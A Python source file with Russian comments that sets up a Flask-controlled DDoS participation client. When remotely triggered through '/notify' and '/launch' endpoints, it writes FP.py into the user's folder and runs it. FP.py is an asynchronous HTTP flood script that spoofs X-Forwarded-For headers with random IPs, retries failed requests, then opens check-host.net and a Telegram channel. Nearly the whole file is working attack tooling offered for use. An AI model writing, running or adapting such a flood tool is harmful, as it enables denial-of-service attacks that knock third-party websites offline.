import os
import subprocess
import threading
import time
from flask import Flask, request, jsonify

app = Flask(__name__)


class WNAStart:
    def __init__(self):
        self.participate = False
        self.create_wnad_folder()
        self.create_fp_file()  # Создание файла FP.py
        self.create_mssg_file()  # Создание файла MSSG.py

    def create_wnad_folder(self):
        """Создает папку WNAD, если она не существует."""
        username = os.getlogin()
        self.wnad_path = f"C:\\Users\\{username}\\WNAD"
        if not os.path.exists(self.wnad_path):
            os.makedirs(self.wnad_path)
            print(f"Создана папка: {self.wnad_path}")

    def create_fp_file(self):
        """Создает файл FP.py, если он не существует."""
        fp_path = os.path.join(self.wnad_path, "FP.py")
        if not os.path.exists(fp_path):
            fp_code = """
import aiohttp
import asyncio
import random
import webbrowser

# List of 200 fake IPs
fake_ips = [f"192.168.{random.randint(0, 255)}.{random.randint(0, 255)}" for _ in range(200)]

async def send_request(session, url, request_number, total_requests):
    headers = {"X-Forwarded-For": fake_ips[request_number % 200]}
    try:
        async with session.get(url, headers=headers) as response:
            if response.status == 200:
                print(f"Request {request_number} of {total_requests} sent successfully from IP {headers['X-Forwarded-For']}.")
    except Exception as e:
        # Retry with a new IP if an exception occurs
        headers["X-Forwarded-For"] = fake_ips[(request_number + 1) % 200]
        await send_request(session, url, request_number, total_requests)

async def ddos_attack(url, num_requests):
    async with aiohttp.ClientSession() as session:
        tasks = [send_request(session, url, i + 1, num_requests) for i in range(num_requests)]
        await asyncio.gather(*tasks)

if __name__ == "__main__":
    target_url = input("Enter the website link: ")
    num_requests = int(input("Number of requests: "))

    # Run the DDoS attack
    asyncio.run(ddos_attack(target_url, num_requests))

    # Open the links in the browser
    webbrowser.open(f"https://check-host.net/check-http?host={target_url}")
    webbrowser.open("https://t.me/wnacat")
"""
            with open(fp_path, "w", encoding="utf-8") as file:
                file.write(fp_code)
            print(f"Создан файл: {fp_path}")

    def create_mssg_file(self):
        """Создает файл MSSG.py, если он не существует."""
        mssg_path = os.path.join(self.wnad_path, "MSSG.py")
        if not os.path.exists(mssg_path):
            mssg_code = """
import os
import subprocess

def open_notepad_with_message():
    # Создаем временный файл с сообщением
    message = "ПРОИЗВОДИТСЯ ЗАПУСК FP.py! ПРОСЬБА НЕ ЗАКРЫВАТЬ КОМАНДНУЮ СТРОКУ ДО ОКОНЧАНИЯ!"
    temp_file = os.path.join(os.path.dirname(__file__), "message.txt")

    # Записываем сообщение в файл
    with open(temp_file, "w", encoding="utf-8") as file:
        file.write(message)

    # Открываем файл в блокноте
    subprocess.run(["notepad.exe", temp_file])

if __name__ == "__main__":
    open_notepad_with_message()
"""
            with open(mssg_path, "w", encoding="utf-8") as file:
                file.write(mssg_code)
            print(f"Создан файл: {mssg_path}")

    def message_users(self):
        print("Оповещение о начале запуска, участвовать? [Да\\Нет]")

        # Таймер на 2 минуты
        def timeout():
            time.sleep(120)  # 2 минуты
            if not self.participate:
                print("Время вышло. Участие отклонено.")
                exit()

        timer = threading.Thread(target=timeout)
        timer.start()

        choice = input("% ")
        timer.join(timeout=0.1)  # Остановка таймера, если пользователь ответил

        if choice.lower() == "да":
            self.participate = True
            print("Продолжение программы")
            # Запуск MSSG.py
            subprocess.run(["python", os.path.join(self.wnad_path, "MSSG.py")])
            return True
        else:
            print("Процесс завершен.")
            return False

    def launch(self, link, number):
        if not self.participate:
            print("Участие отклонено.")
            return

        print(f"Запуск FP.py с параметрами: ссылка={link}, число={number}")
        # Запуск файла FP.py
        subprocess.run(["python", os.path.join(self.wnad_path, "FP.py"), link, number])


# Flask API для взаимодействия с wnaget
@app.route("/notify", methods=["POST"])
def notify():
    wnastart = WNAStart()
    approved = wnastart.message_users()
    return jsonify({"approved": approved})


@app.route("/launch", methods=["POST"])
def launch():
    data = request.json
    link = data.get("link")
    number = data.get("number")
    wnastart = WNAStart()
    wnastart.launch(link, number)
    return jsonify({"status": "success"})


def main():
    # Запуск Flask-сервера
    app.run(port=5000)


if __name__ == "__main__":
    main()